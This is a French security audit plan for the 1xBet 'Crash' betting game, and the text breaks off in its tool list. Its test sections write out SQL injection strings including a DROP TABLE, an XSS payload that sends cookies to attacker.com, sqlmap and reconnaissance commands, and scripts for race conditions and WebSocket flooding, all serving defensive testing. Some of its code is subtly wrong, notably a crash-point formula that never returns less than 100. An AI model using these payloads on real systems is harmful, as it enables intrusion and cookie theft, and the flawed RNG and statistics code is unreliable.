# AUDIT DE SÉCURITÉ - JEU CRASH 1xBET

**Date**: 24 Novembre 2025
**Objectif**: Identifier et tester toutes les vulnérabilités potentielles du jeu Crash pour garantir une sécurité maximale contre les tentatives de piratage.

---

## TABLE DES MATIÈRES

1. [Vue d'ensemble](#1-vue-densemble)
2. [Périmètre de l'audit](#2-périmètre-de-laudit)
3. [Vulnérabilités critiques à tester](#3-vulnérabilités-critiques-à-tester)
4. [Tests de pénétration](#4-tests-de-pénétration)
5. [Sécurité du générateur de nombres aléatoires](#5-sécurité-du-générateur-de-nombres-aléatoires)
6. [Sécurité backend et API](#6-sécurité-backend-et-api)
7. [Sécurité client-side](#7-sécurité-client-side)
8. [Recommandations de sécurisation](#8-recommandations-de-sécurisation)
9. [Plan d'action](#9-plan-daction)

---

## 1. VUE D'ENSEMBLE

Le jeu Crash est un jeu de paris où:
- Un multiplicateur commence à 1.00x et augmente progressivement
- Les joueurs parient et peuvent retirer leurs gains à tout moment
- Le jeu "crash" à un moment aléatoire et imprévisible
- Les joueurs doivent retirer avant le crash pour gagner

**RISQUES DE SÉCURITÉ MAJEURS**:
- Manipulation du multiplicateur
- Prédiction du point de crash
- Manipulation des paris
- Exploitation de la synchronisation temps réel

---

## 2. PÉRIMÈTRE DE L'AUDIT

### 2.1 Composants à auditer

- ✅ **Backend**: Serveur de jeu, API, logique métier
- ✅ **Frontend**: Interface utilisateur, WebSocket, communications
- ✅ **Base de données**: Intégrité des données, injection SQL
- ✅ **RNG (Random Number Generator)**: Générateur de nombres aléatoires
- ✅ **Système de paiement**: Transactions, validation des paris
- ✅ **Authentication**: Gestion des sessions utilisateurs
- ✅ **Infrastructure**: Serveurs, réseau, protection DDoS

### 2.2 Types d'attaques à tester

1. Manipulation du client (Client-Side Manipulation)
2. Attaques par rejeu (Replay Attacks)
3. Attaques de timing (Race Conditions)
4. Injection de code (SQL, XSS, Command Injection)
5. Manipulation des WebSockets
6. Attaques par force brute
7. Exploitation du RNG
8. Man-in-the-Middle (MITM)

---

## 3. VULNÉRABILITÉS CRITIQUES À TESTER

### 3.1 🔴 CRITIQUE - Prédiction du RNG

**Description**: Tentative de prédire le point de crash en analysant le générateur de nombres aléatoires.

**Vecteurs d'attaque**:
```
- Analyse de patterns dans les résultats passés
- Reverse engineering du seed RNG
- Attaque sur des RNG faibles (Linear Congruential Generator)
- Exploitation de l'horloge système comme seed
- Timing attacks sur le serveur
```

**Tests à effectuer**:
1. ✅ Vérifier que le RNG est cryptographiquement sûr (ex: crypto.randomBytes)
2. ✅ Tester l'impossibilité de déduire le seed
3. ✅ Analyser 10,000+ résultats pour patterns statistiques
4. ✅ Vérifier que le crash point est généré côté serveur uniquement
5. ✅ Tester la protection contre le seeding prédictible

**Outils**:
```bash
- NIST Statistical Test Suite
- TestU01 (suite de tests RNG)
- Dieharder Random Number Test
- Analyse avec Python/NumPy pour patterns
```

---

### 3.2 🔴 CRITIQUE - Manipulation du multiplicateur

**Description**: Tentative de modifier le multiplicateur côté client pour afficher un crash plus tard.

**Vecteurs d'attaque**:
```
- Modification du JavaScript via DevTools
- Injection de code via extensions navigateur
- Modification des messages WebSocket
- Tampering avec la mémoire du navigateur
- Attaque MITM pour modifier les données en transit
```

**Tests à effectuer**:
1. ✅ Vérifier que le multiplicateur est calculé UNIQUEMENT côté serveur
2. ✅ Tester la validation serveur de tous les cashouts
3. ✅ Vérifier la signature cryptographique des messages
4. ✅ Tester l'impossibilité de modifier les WebSocket messages
5. ✅ Vérifier le timestamp serveur vs client

**Code de test conceptuel**:
```javascript
// Test: Essayer de modifier le multiplicateur côté client
// DOIT ÉCHOUER si sécurisé correctement

// Tentative 1: Modification directe
window.currentMultiplier = 999.99; // Ne doit PAS affecter le serveur

// Tentative 2: Interception WebSocket
const originalSend = WebSocket.prototype.send;
WebSocket.prototype.send = function(data) {
    // Modifier data pour changer le cashout
    // DOIT être rejeté par le serveur
};
```

---

### 3.3 🔴 CRITIQUE - Manipulation des paris

**Description**: Tentative de placer des paris invalides ou de modifier les montants.

**Vecteurs d'attaque**:
```
- Paris négatifs
- Paris après le début du round
- Double spending
- Modification du montant après validation
- Cashout multiple pour un même pari
- Cashout après le crash
```

**Tests à effectuer**:
1. ✅ Tester les paris avec montants négatifs (-100)
2. ✅ Tester les paris après démarrage du jeu
3. ✅ Tester le double cashout sur un même pari
4. ✅ Tester le cashout après le crash (late cashout)
5. ✅ Tester les paris dépassant le solde disponible
6. ✅ Vérifier la validation des montants décimaux (0.00001)
7. ✅ Tester les attaques par race condition sur les paris

**Scenarios de test**:
```python
# Test 1: Pari négatif
POST /api/bet
{
  "amount": -1000,
  "round_id": "abc123"
}
# Résultat attendu: Rejeté avec erreur 400

# Test 2: Double cashout
POST /api/cashout {"bet_id": "xyz", "multiplier": 2.5}
POST /api/cashout {"bet_id": "xyz", "multiplier": 3.0}
# Résultat attendu: Deuxième requête rejetée

# Test 3: Cashout tardif
# Attendre le crash
POST /api/cashout {"bet_id": "xyz", "multiplier": 5.0}
# Résultat attendu: Rejeté (jeu déjà crashé)
```

---

### 3.4 🟠 ÉLEVÉ - Race Conditions

**Description**: Exploitation des conditions de course dans les transactions.

**Vecteurs d'attaque**:
```
- Cashout simultanés multiples
- Paris simultanés dépassant le solde
- Exploitation de la latence réseau
- Attaques de synchronisation temporelle
```

**Tests à effectuer**:
1. ✅ Envoyer 100 requêtes de cashout simultanées pour un même pari
2. ✅ Placer 10 paris simultanés avec solde insuffisant
3. ✅ Tester les locks de base de données (transactions ACID)
4. ✅ Vérifier les mécanismes de queue/throttling
5. ✅ Tester avec haute latence réseau simulée

**Script de test**:
```python
import asyncio
import aiohttp

async def test_race_condition():
    """Test de race condition sur cashout"""
    bet_id = "test_bet_123"

    async def cashout_attempt():
        async with aiohttp.ClientSession() as session:
            async with session.post(
                'https://api.example.com/cashout',
                json={'bet_id': bet_id, 'multiplier': 2.5}
            ) as resp:
                return await resp.json()

    # Envoyer 100 requêtes simultanées
    results = await asyncio.gather(*[cashout_attempt() for _ in range(100)])

    # Vérifier qu'une seule a réussi
    successful = [r for r in results if r.get('success')]
    assert len(successful) == 1, "Race condition vulnerability detected!"

asyncio.run(test_race_condition())
```

---

### 3.5 🟠 ÉLEVÉ - Attaques par rejeu (Replay Attacks)

**Description**: Réutilisation de requêtes légitimes pour répéter des actions.

**Vecteurs d'attaque**:
```
- Capture et rejeu de requêtes de pari gagnantes
- Rejeu de transactions de cashout
- Exploitation de tokens de session réutilisables
```

**Tests à effectuer**:
1. ✅ Capturer une requête de cashout réussie
2. ✅ Rejouer la requête exacte plusieurs fois
3. ✅ Vérifier la présence de nonces/timestamps
4. ✅ Tester l'expiration des tokens
5. ✅ Vérifier les signatures HMAC avec timestamp

**Protection requise**:
```javascript
// Chaque requête doit inclure:
{
  "action": "cashout",
  "bet_id": "xyz",
  "timestamp": 1700000000000,
  "nonce": "unique-random-value",
  "signature": "HMAC-SHA256(data + secret)"
}

// Le serveur doit:
// 1. Vérifier que timestamp est récent (< 30 secondes)
// 2. Vérifier que le nonce n'a jamais été utilisé
// 3. Valider la signature HMAC
```

---

### 3.6 🟠 ÉLEVÉ - Injection SQL

**Description**: Exploitation de requêtes SQL non sécurisées.

**Vecteurs d'attaque**:
```
- Injection dans les paramètres de pari
- Injection dans user_id
- Injection dans round_id
- Second-order SQL injection
```

**Tests à effectuer**:
```sql
-- Test 1: Injection basique
user_id: ' OR '1'='1
bet_amount: 100; DROP TABLE bets; --
round_id: ' UNION SELECT * FROM users --

-- Test 2: Injection aveugle (blind)
user_id: ' AND SLEEP(5) --
user_id: ' AND (SELECT COUNT(*) FROM bets) > 100 --

-- Test 3: Error-based injection
user_id: ' AND 1=CONVERT(int, (SELECT @@version)) --
```

**Outils de test**:
```bash
sqlmap -u "https://api.example.com/bet?user_id=123" --batch
sqlmap --forms --crawl=2 -u "https://api.example.com"
```

---

### 3.7 🟠 ÉLEVÉ - XSS (Cross-Site Scripting)

**Description**: Injection de scripts malveillants dans l'interface.

**Tests à effectuer**:
```html
<!-- Test 1: XSS Reflected -->
username: <script>alert('XSS')</script>
username: <img src=x onerror=alert('XSS')>

<!-- Test 2: XSS Stored (dans chat/profil) -->
message: <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

<!-- Test 3: DOM-based XSS -->
#<img src=x onerror=alert('XSS')>
javascript:alert('XSS')
```

---

### 3.8 🟡 MOYEN - Manipulation WebSocket

**Description**: Interception et modification des communications WebSocket.

**Tests à effectuer**:
1. ✅ Capturer les messages WebSocket avec Burp Suite
2. ✅ Modifier les messages avant envoi
3. ✅ Tester l'envoi de messages malformés
4. ✅ Vérifier le chiffrement TLS sur WebSocket (wss://)
5. ✅ Tester le flooding de messages

**Script de test**:
```python
import websocket
import json

def test_websocket_tampering():
    """Test de manipulation WebSocket"""
    ws = websocket.WebSocket()
    ws.connect("wss://game.example.com/crash")

    # Test 1: Message malformé
    ws.send("invalid_json{{{")

    # Test 2: Action non autorisée
    ws.send(json.dumps({
        "action": "admin_override",
        "crash_point": 1.01
    }))

    # Test 3: Flooding
    for i in range(1000):
        ws.send(json.dumps({"action": "bet", "amount": 1}))
```

---

### 3.9 🟡 MOYEN - Attaques de timing

**Description**: Déduction d'informations via l'analyse des temps de réponse.

**Tests à effectuer**:
```python
import time
import requests

def timing_attack_test():
    """Test d'attaque par timing pour détecter des patterns"""

    results = []
    for _ in range(1000):
        start = time.time()
        r = requests.get('https://api.example.com/crash/status')
        elapsed = time.time() - start

        results.append({
            'time': elapsed,
            'data': r.json()
        })

    # Analyser si le temps de réponse corrèle avec le crash point
    # Si oui = vulnérabilité
```

---

### 3.10 🟡 MOYEN - Énumération d'informations

**Description**: Collecte d'informations sensibles via l'API.

**Tests à effectuer**:
```bash
# Test 1: Énumération des utilisateurs
GET /api/user/1
GET /api/user/2
...
GET /api/user/99999

# Test 2: Énumération des rounds
GET /api/round/history?limit=100000

# Test 3: Information disclosure
GET /api/debug
GET /api/status
GET /.git/config
GET /api/docs
```

---

## 4. TESTS DE PÉNÉTRATION

### 4.1 Phase de reconnaissance

```bash
# Scan de ports
nmap -sV -sC target-domain.com

# Énumération DNS
dig target-domain.com ANY
dnsenum target-domain.com

# Découverte de sous-domaines
sublist3r -d target-domain.com
amass enum -d target-domain.com

# Analyse des technologies
whatweb target-domain.com
wappalyzer
```

### 4.2 Phase de scanning

```bash
# Scan de vulnérabilités web
nikto -h https://target-domain.com

# Scan SSL/TLS
sslscan target-domain.com
testssl.sh target-domain.com

# Fuzzing de directories
gobuster dir -u https://target-domain.com -w /usr/share/wordlists/dirb/common.txt

# Scan d'API
arjun -u https://api.target-domain.com/bet
```

### 4.3 Phase d'exploitation

**Outils recommandés**:
- Burp Suite Professional
- OWASP ZAP
- Postman/Insomnia (tests API)
- SQLMap (injection SQL)
- XSSer (tests XSS)
- Metasploit Framework

### 4.4 Scénarios de test complets

#### Scénario 1: Tentative de manipulation complète
```
1. Intercepter le trafic avec Burp Suite
2. Identifier les endpoints d'API
3. Analyser la structure des requêtes
4. Tenter de modifier:
   - Montant du pari après validation
   - Multiplicateur de cashout
   - Timestamp des actions
   - Identifiants de session
5. Vérifier les validations côté serveur
6. Documenter toutes les vulnérabilités trouvées
```

#### Scénario 2: Test de l'intégrité du RNG
```python
import requests
import numpy as np
from scipy import stats

def test_rng_integrity():
    """Test statistique de l'intégrité du RNG"""

    # Collecter 10,000 résultats de crash
    crashes = []
    for _ in range(10000):
        r = requests.get('https://api.example.com/crash/result')
        crashes.append(r.json()['crash_point'])

    # Test 1: Distribution uniforme
    ks_stat, p_value = stats.kstest(crashes, 'uniform')
    print(f"Kolmogorov-Smirnov: p-value = {p_value}")
    # p-value < 0.05 = non-aléatoire (VULNÉRABLE)

    # Test 2: Autocorrélation
    acf = np.correlate(crashes, crashes, mode='full')
    print(f"Autocorrélation max: {max(acf)}")
    # Autocorrélation élevée = patterns (VULNÉRABLE)

    # Test 3: Chi-square goodness of fit
    chi2, p_chi = stats.chisquare(crashes)
    print(f"Chi-square: p-value = {p_chi}")

    # Test 4: Runs test
    median = np.median(crashes)
    runs = [1 if x > median else 0 for x in crashes]
    # Analyser les séquences

    return {
        'ks_test_passed': p_value > 0.05,
        'no_correlation': max(acf) < threshold,
        'chi_square_passed': p_chi > 0.05
    }
```

---

## 5. SÉCURITÉ DU GÉNÉRATEUR DE NOMBRES ALÉATOIRES

### 5.1 Exigences de sécurité RNG

**RNG DOIT ÊTRE**:
- ✅ Cryptographiquement sûr (CSPRNG)
- ✅ Non prédictible même avec millions d'échantillons
- ✅ Seed provenant d'une source d'entropie sécurisée
- ✅ Généré côté serveur uniquement
- ✅ Vérifiable (Provably Fair)

### 5.2 Implémentation recommandée

```javascript
// ❌ MAUVAIS - NE JAMAIS UTILISER
function generateCrashPoint() {
    return Math.random() * 10; // VULNÉRABLE!
}

// ✅ BON - Utiliser crypto.randomBytes
const crypto = require('crypto');

function generateSecureCrashPoint() {
    // Utiliser un CSPRNG
    const randomBytes = crypto.randomBytes(32);
    const randomValue = randomBytes.readUInt32BE(0) / 0xFFFFFFFF;

    // Convertir en crash point avec distribution appropriée
    // Ex: distribution exponentielle pour crash game
    const crashPoint = Math.floor((100 / (1 - randomValue)) * 100) / 100;

    return Math.max(1.00, Math.min(crashPoint, 1000000.00));
}
```

### 5.3 Système Provably Fair

**Implémentation**:
```javascript
const crypto = require('crypto');

class ProvablyFairCrashGame {
    /**
     * Génère un hash pour un round avant qu'il ne commence
     * Les joueurs peuvent vérifier après que le résultat n'a pas été manipulé
     */
    generateServerSeed() {
        return crypto.randomBytes(32).toString('hex');
    }

    generateClientSeed() {
        return crypto.randomBytes(16).toString('hex');
    }

    calculateCrashPoint(serverSeed, clientSeed, nonce) {
        // Combiner les seeds avec le nonce
        const combined = `${serverSeed}:${clientSeed}:${nonce}`;
        const hash = crypto.createHash('sha256').update(combined).digest('hex');

        // Convertir le hash en crash point
        const value = parseInt(hash.substring(0, 8), 16) / 0xFFFFFFFF;
        const crashPoint = Math.floor((100 / (1 - value)) * 100) / 100;

        return Math.max(1.00, Math.min(crashPoint, 1000000.00));
    }

    /**
     * Avant le round: publier hash(serverSeed)
     * Après le round: révéler serverSeed
     * Les joueurs peuvent vérifier: hash(serverSeed) == hash publié
     */
    publishSeedHash(serverSeed) {
        return crypto.createHash('sha256').update(serverSeed).digest('hex');
    }
}
```

### 5.4 Tests de validation RNG

```bash
# Test avec NIST Statistical Test Suite
./assess 10000000 < random_numbers.bin

# Test avec Dieharder
dieharder -a -g 201 -f random_numbers.bin

# Test avec TestU01
./bbattery SmallCrush
./bbattery Crush
./bbattery BigCrush
```

---

## 6. SÉCURITÉ BACKEND ET API

### 6.1 Checklist de sécurité backend

- [ ] **Authentication & Authorization**
  - [ ] JWT avec expiration courte (15 min)
  - [ ] Refresh tokens sécurisés
  - [ ] Rate limiting sur login (5 tentatives/minute)
  - [ ] 2FA pour transactions importantes
  - [ ] Validation des rôles/permissions

- [ ] **Validation des entrées**
  - [ ] Validation stricte de tous les paramètres
  - [ ] Whitelist des valeurs acceptées
  - [ ] Sanitization des inputs
  - [ ] Type checking strict
  - [ ] Limits sur les valeurs numériques

- [ ] **Protection des transactions**
  - [ ] ACID transactions sur base de données
  - [ ] Pessimistic locking pour les paris
  - [ ] Idempotency keys pour éviter double processing
  - [ ] Validation du solde AVANT et APRÈS transaction
  - [ ] Audit log de toutes les transactions

- [ ] **Protection API**
  - [ ] Rate limiting global (100 req/min/IP)
  - [ ] Rate limiting par utilisateur (50 req/min)
  - [ ] CORS configuration stricte
  - [ ] HTTPS uniquement (TLS 1.3)
  - [ ] HSTS headers
  - [ ] CSP headers

### 6.2 Exemple d'implémentation sécurisée

```javascript
const express = require('express');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const jwt = require('jsonwebtoken');

const app = express();

// Security headers
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https:"],
            connectSrc: ["'self'", "wss://api.example.com"],
            frameSrc: ["'none'"],
            objectSrc: ["'none'"]
        }
    },
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
    }
}));

// Rate limiting
const limiter = rateLimit({
    windowMs: 1 * 60 * 1000, // 1 minute
    max: 100, // 100 requests par minute
    message: 'Trop de requêtes, veuillez réessayer plus tard'
});
app.use('/api/', limiter);

// Middleware de validation
function validateBet(req, res, next) {
    const { amount, round_id } = req.body;

    // Validation stricte
    if (typeof amount !== 'number' || amount <= 0 || amount > 1000000) {
        return res.status(400).json({ error: 'Montant invalide' });
    }

    if (!round_id || typeof round_id !== 'string' || !/^[a-zA-Z0-9-]+$/.test(round_id)) {
        return res.status(400).json({ error: 'Round ID invalide' });
    }

    // Vérifier que le montant a max 2 décimales
    if (!Number.isInteger(amount * 100)) {
        return res.status(400).json({ error: 'Montant doit avoir max 2 décimales' });
    }

    next();
}

// Endpoint sécurisé de pari
app.post('/api/bet', authenticateToken, validateBet, async (req, res) => {
    const { amount, round_id } = req.body;
    const user_id = req.user.id;

    // Utiliser une transaction pour garantir l'atomicité
    const connection = await pool.getConnection();
    try {
        await connection.beginTransaction();

        // 1. Vérifier le solde avec lock pessimiste
        const [user] = await connection.query(
            'SELECT balance FROM users WHERE id = ? FOR UPDATE',
            [user_id]
        );

        if (user[0].balance < amount) {
            await connection.rollback();
            return res.status(400).json({ error: 'Solde insuffisant' });
        }

        // 2. Vérifier que le round est ouvert
        const [round] = await connection.query(
            'SELECT status FROM rounds WHERE id = ? AND status = "open"',
            [round_id]
        );

        if (round.length === 0) {
            await connection.rollback();
            return res.status(400).json({ error: 'Round fermé ou invalide' });
        }

        // 3. Déduire le montant
        await connection.query(
            'UPDATE users SET balance = balance - ? WHERE id = ?',
            [amount, user_id]
        );

        // 4. Créer le pari avec idempotency key
        const bet_id = crypto.randomUUID();
        await connection.query(
            'INSERT INTO bets (id, user_id, round_id, amount, timestamp) VALUES (?, ?, ?, ?, NOW())',
            [bet_id, user_id, round_id, amount]
        );

        // 5. Logger l'action
        await connection.query(
            'INSERT INTO audit_log (action, user_id, details) VALUES (?, ?, ?)',
            ['BET_PLACED', user_id, JSON.stringify({ bet_id, amount, round_id })]
        );

        await connection.commit();

        res.json({
            success: true,
            bet_id,
            new_balance: user[0].balance - amount
        });

    } catch (error) {
        await connection.rollback();
        console.error('Bet error:', error);
        res.status(500).json({ error: 'Erreur serveur' });
    } finally {
        connection.release();
    }
});

function authenticateToken(req, res, next) {
    const token = req.headers['authorization']?.split(' ')[1];

    if (!token) {
        return res.status(401).json({ error: 'Token manquant' });
    }

    try {
        const decoded = jwt.verify(token, process.env.JWT_SECRET);

        // Vérifier l'expiration
        if (decoded.exp < Date.now() / 1000) {
            return res.status(401).json({ error: 'Token expiré' });
        }

        req.user = decoded;
        next();
    } catch (error) {
        return res.status(403).json({ error: 'Token invalide' });
    }
}
```

---

## 7. SÉCURITÉ CLIENT-SIDE

### 7.1 Protection du code JavaScript

```javascript
// Configuration de sécurité client
const SecurityManager = {
    // Détection de manipulation du DevTools
    detectDevTools() {
        const threshold = 160;
        const widthThreshold = window.outerWidth - window.innerWidth > threshold;
        const heightThreshold = window.outerHeight - window.innerHeight > threshold;

        if (widthThreshold || heightThreshold) {
            console.warn('DevTools détecté - Actions surveillées');
            // Logger côté serveur
            this.reportSuspiciousActivity('DEVTOOLS_OPEN');
        }
    },

    // Protection contre modification du code
    integrityCheck() {
        const scripts = document.getElementsByTagName('script');
        for (let script of scripts) {
            if (script.src && !script.integrity) {
                console.error('Script sans SRI détecté');
                this.reportSuspiciousActivity('MISSING_SRI');
            }
        }
    },

    // Détection de proxy/debugging
    detectDebugging() {
        const start = performance.now();
        debugger; // eslint-disable-line no-debugger
        const end = performance.now();

        if (end - start > 100) {
            this.reportSuspiciousActivity('DEBUGGER_DETECTED');
        }
    },

    reportSuspiciousActivity(type) {
        fetch('/api/security/report', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type,
                timestamp: Date.now(),
                userAgent: navigator.userAgent,
                url: window.location.href
            })
        });
    }
};

// Exécuter les checks périodiquement
setInterval(() => {
    SecurityManager.detectDevTools();
    SecurityManager.detectDebugging();
}, 1000);
```

### 7.2 Obfuscation du code

```bash
# Utiliser des outils d'obfuscation
npm install -g javascript-obfuscator

# Obfusquer le code de production
javascript-obfuscator input.js --output output.js \
  --compact true \
  --control-flow-flattening true \
  --control-flow-flattening-threshold 1 \
  --dead-code-injection true \
  --dead-code-injection-threshold 0.4 \
  --string-array true \
  --string-array-encoding 'base64' \
  --string-array-threshold 1 \
  --unicode-escape-sequence true
```

### 7.3 Subresource Integrity (SRI)

```html
<!-- Tous les scripts externes doivent avoir SRI -->
<script
  src="https://cdn.example.com/game.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous">
</script>

<link
  rel="stylesheet"
  href="https://cdn.example.com/style.css"
  integrity="sha384-HASH-HERE"
  crossorigin="anonymous">
```

---

## 8. RECOMMANDATIONS DE SÉCURISATION

### 8.1 Architecture de sécurité recommandée

```
┌─────────────────────────────────────────────────────────┐
│                    COUCHE FRONTEND                       │
│  - Code obfusqué                                        │
│  - CSP strict                                            │
│  - SRI sur tous les assets                              │
│  - Détection de manipulation                            │
└───────────────┬─────────────────────────────────────────┘
                │ HTTPS/WSS (TLS 1.3)
┌───────────────▼─────────────────────────────────────────┐
│                    WAF / CDN                             │
│  - Cloudflare / AWS WAF                                 │
│  - Protection DDoS                                       │
│  - Rate limiting                                         │
│  - Geo-blocking si nécessaire                           │
└───────────────┬─────────────────────────────────────────┘
                │
┌───────────────▼─────────────────────────────────────────┐
│                    LOAD BALANCER                         │
│  - Distribution de charge                               │
│  - Health checks                                         │
│  - SSL termination                                       │
└───────────────┬─────────────────────────────────────────┘
                │
┌───────────────▼─────────────────────────────────────────┐
│                    API GATEWAY                           │
│  - Authentication (JWT)                                  │
│  - Rate limiting par utilisateur                        │
│  - Request validation                                    │
│  - API versioning                                        │
└───────────────┬─────────────────────────────────────────┘
                │
┌───────────────▼─────────────────────────────────────────┐
│               SERVEURS APPLICATION                       │
│  - Node.js / Python / Go                                │
│  - Logique métier                                       │
│  - Validation stricte                                    │
│  - Génération RNG cryptographique                       │
│  - Transactions ACID                                     │
└───────────────┬─────────────────────────────────────────┘
                │
┌───────────────▼─────────────────────────────────────────┐
│               BASE DE DONNÉES                            │
│  - PostgreSQL / MySQL avec chiffrement                  │
│  - Prepared statements uniquement                       │
│  - Backup chiffré quotidien                             │
│  - Audit logging                                         │
│  - Row-level security                                    │
└─────────────────────────────────────────────────────────┘
```

### 8.2 Configuration serveur recommandée

```nginx
# nginx.conf - Configuration sécurisée

server {
    listen 443 ssl http2;
    server_name api.example.com;

    # SSL Configuration
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    ssl_protocols TLSv1.3 TLSv1.2;
    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512;
    ssl_prefer_server_ciphers on;
    ssl_session_cache shared:SSL:10m;

    # Security Headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "no-referrer-when-downgrade" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' wss://api.example.com; frame-src 'none'; object-src 'none';" always;

    # Rate Limiting
    limit_req_zone $binary_remote_addr zone=api_limit:10m rate=100r/m;
    limit_req zone=api_limit burst=20 nodelay;

    # Hide version
    server_tokens off;

    location /api/ {
        proxy_pass http://backend;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        # Timeouts
        proxy_connect_timeout 5s;
        proxy_send_timeout 10s;
        proxy_read_timeout 10s;
    }

    location /ws/ {
        proxy_pass http://websocket_backend;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_read_timeout 3600s;
    }
}
```

### 8.3 Variables d'environnement sécurisées

```bash
# .env.example - JAMAIS commiter le vrai .env

# Database
DB_HOST=localhost
DB_PORT=5432
DB_NAME=crash_game
DB_USER=app_user
DB_PASSWORD=STRONG_RANDOM_PASSWORD_HERE

# JWT
JWT_SECRET=RANDOM_256_BIT_SECRET
JWT_EXPIRATION=15m
REFRESH_TOKEN_SECRET=ANOTHER_RANDOM_SECRET
REFRESH_TOKEN_EXPIRATION=7d

# RNG
RNG_SEED_SOURCE=hardware # ou external API
SERVER_SEED_ROTATION_INTERVAL=24h

# API Keys
PAYMENT_API_KEY=xxx
PAYMENT_API_SECRET=xxx

# Security
RATE_LIMIT_WINDOW=60000
RATE_LIMIT_MAX=100
MAX_BET_AMOUNT=100000
MIN_BET_AMOUNT=1

# Monitoring
SENTRY_DSN=https://xxx
LOG_LEVEL=info
```

### 8.4 Monitoring et alerting

```javascript
// Système de monitoring des activités suspectes

const SuspiciousActivityDetector = {
    // Patterns suspects à détecter
    patterns: {
        RAPID_BETTING: {
            threshold: 10, // 10 paris en 1 seconde
            window: 1000,
            severity: 'HIGH'
        },
        IMPOSSIBLE_TIMING: {
            // Cashout trop rapide après crash (< 100ms)
            threshold: 100,
            severity: 'CRITICAL'
        },
        UNUSUAL_WIN_RATE: {
            // Taux de gain > 70% sur 100 paris
            threshold: 0.70,
            sample_size: 100,
            severity: 'HIGH'
        },
        MULTIPLE_ACCOUNTS: {
            // Même IP, même browser fingerprint
            severity: 'MEDIUM'
        }
    },

    async checkUser(user_id) {
        const checks = await Promise.all([
            this.checkRapidBetting(user_id),
            this.checkWinRate(user_id),
            this.checkTimingAnomaly(user_id)
        ]);

        const alerts = checks.filter(c => c.suspicious);

        if (alerts.length > 0) {
            await this.triggerAlert(user_id, alerts);
        }
    },

    async triggerAlert(user_id, alerts) {
        // 1. Logger dans la base
        await db.query(
            'INSERT INTO security_alerts (user_id, alerts, timestamp) VALUES (?, ?, NOW())',
            [user_id, JSON.stringify(alerts)]
        );

        // 2. Notifier l'équipe de sécurité
        await this.notifySecurityTeam({
            user_id,
            alerts,
            severity: Math.max(...alerts.map(a => a.severity))
        });

        // 3. Limiter temporairement l'utilisateur si CRITICAL
        if (alerts.some(a => a.severity === 'CRITICAL')) {
            await this.temporaryRestriction(user_id, 3600); // 1 heure
        }
    }
};
```

### 8.5 Checklist finale de sécurité

#### Backend ✅
- [ ] RNG cryptographiquement sûr (crypto.randomBytes)
- [ ] Système Provably Fair implémenté
- [ ] Tous les calculs côté serveur uniquement
- [ ] Validation stricte de tous les inputs
- [ ] Prepared statements (pas de SQL brut)
- [ ] Transactions ACID avec locks
- [ ] Rate limiting sur toutes les routes
- [ ] JWT avec expiration courte
- [ ] Logging de toutes les transactions
- [ ] Monitoring des activités suspectes
- [ ] Backup automatisé quotidien

#### Frontend ✅
- [ ] Code obfusqué en production
- [ ] SRI sur tous les assets externes
- [ ] CSP headers configurés
- [ ] Pas de logique métier côté client
- [ ] Pas de calculs de multiplicateur côté client
- [ ] Détection de manipulation (optionnel)
- [ ] HTTPS uniquement

#### Infrastructure ✅
- [ ] WAF activé (Cloudflare/AWS WAF)
- [ ] Protection DDoS
- [ ] TLS 1.3 minimum
- [ ] HSTS activé
- [ ] Certificats SSL valides
- [ ] Geo-blocking si nécessaire
- [ ] CDN pour assets statiques
- [ ] Load balancer configuré

#### Base de données ✅
- [ ] Chiffrement au repos
- [ ] Chiffrement en transit
- [ ] Accès restreint (whitelist IP)
- [ ] Utilisateur DB avec privilèges minimaux
- [ ] Audit logging activé
- [ ] Backup chiffré
- [ ] Restoration testée régulièrement

#### Monitoring ✅
- [ ] Logs centralisés (ELK/Splunk)
- [ ] Alertes automatiques
- [ ] Dashboard de sécurité
- [ ] Audit trail de toutes les actions
- [ ] Surveillance temps réel
- [ ] Rapports réguliers

---

## 9. PLAN D'ACTION

### Phase 1: Audit initial (Semaine 1-2)
1. ✅ Installation de l'environnement de test
2. ✅ Reconnaissance et mapping de l'application
3. ✅ Identification des endpoints critiques
4. ✅ Tests de sécurité automatisés (OWASP ZAP, Burp)
5. ✅ Analyse du code source (si accessible)

### Phase 2: Tests approfondis (Semaine 3-4)
1. ✅ Tests du RNG (10,000+ échantillons)
2. ✅ Tests de manipulation des paris
3. ✅ Tests de race conditions
4. ✅ Tests d'injection (SQL, XSS, etc.)
5. ✅ Tests de sécurité WebSocket
6. ✅ Tests de timing attacks

### Phase 3: Exploitation (Semaine 5)
1. ✅ Tentatives d'exploitation des vulnérabilités trouvées
2. ✅ Documentation des preuves de concept (PoC)
3. ✅ Évaluation de l'impact de chaque vulnérabilité
4. ✅ Classification par criticité

### Phase 4: Rapport (Semaine 6)
1. ✅ Rédaction du rapport d'audit complet
2. ✅ Recommandations de correction
3. ✅ Présentation aux équipes techniques
4. ✅ Plan de remédiation priorisé

### Phase 5: Retest (Semaine 7-8)
1. ✅ Vérification des corrections
2. ✅ Tests de régression
3. ✅ Certification de sécurité
4. ✅ Documentation finale

---

## OUTILS REQUIS

### Outils de test de pénétration
```bash
# Installation des outils essentiels
sudo apt update
sudo apt install -y \
    nmap \
    nikto \
    sqlmap \
